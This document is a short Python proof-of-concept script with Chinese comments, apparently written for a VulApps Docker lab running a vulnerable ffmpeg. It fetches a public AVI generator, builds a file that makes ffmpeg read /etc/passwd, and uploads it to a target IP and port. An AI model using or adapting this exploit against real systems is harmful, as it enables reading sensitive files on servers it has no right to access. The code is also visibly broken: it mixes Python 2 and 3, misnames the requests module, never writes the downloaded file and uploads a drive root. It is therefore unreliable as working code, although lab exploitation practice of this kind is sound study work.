#!/usr/bin/env python
# -*- coding:utf-8 -*-
#python version 3.6.4
#简介：脚本适用于docker下的vulapps环境，使用docker run -d -p 8004:80 medicean/vulapps:f_ffmpeg_1运行环境
#具体参见github地址：https://github.com/Medicean/VulApps/commit/86ee14f3b0c2e7e4fa1aa17655d77bed4184a177
#将poc下载到c盘根目录下
#此处ip为192.168.109.141

import requests
import os
import sys



argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "用法：python",sys.argv[0],"IP地址 端口号"
    print "例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"
    sys.exit()

ip = "192.168.109.141"
port = 8004

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	
py_url="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py"
req=requests.get(py_url)

with open("gen_xbin_avi.py","wb") as f:
	p=os.listdir('C:')
	re="gen_xbin_avi.py"
	if re in p:
		os.system("python3 gen_xbin_avi.py file:///etc/passwd passwd.avi")
		url="http://"+ip+":"+port+"/"
		data=None
		files={"field":("passwd.avi",open("C:","rb"))}
		r=request.post(url,data,files=files)
		print "post successful"
	else:
		print "No Such File"

